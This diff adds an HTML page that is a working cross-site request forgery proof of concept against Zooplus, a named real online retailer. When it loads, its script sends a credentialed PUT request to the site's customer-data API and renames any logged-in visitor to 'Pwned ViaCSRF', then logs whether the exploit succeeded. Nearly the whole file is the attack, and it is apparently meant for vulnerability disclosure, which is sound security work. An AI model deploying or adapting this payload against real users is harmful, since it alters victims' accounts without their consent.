@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Zooplus CSRF PoC</title>
+</head>
+<body>
+  <h1>Zooplus CSRF Exploit PoC</h1>
+  <p>If you're logged into Zooplus in this browser, your name will be changed without your consent.</p>
+
+  <script>
+    fetch("https://www.zooplus.com/customer-data/api/v2/basicData", {
+      method: "PUT",
+      credentials: "include", // Important to send cookies
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        firstName: "Pwned",
+        lastName: "ViaCSRF"
+      })
+    }).then(response => {
+      if (response.ok) {
+        console.log("✅ Exploit executed. User data changed.");
+      } else {
+        console.warn("❌ Exploit failed. Status:", response.status);
+      }
+    }).catch(err => {
+      console.error("🚨 Error during exploit:", err);
+    });
+  </script>
+</body>
+</html>
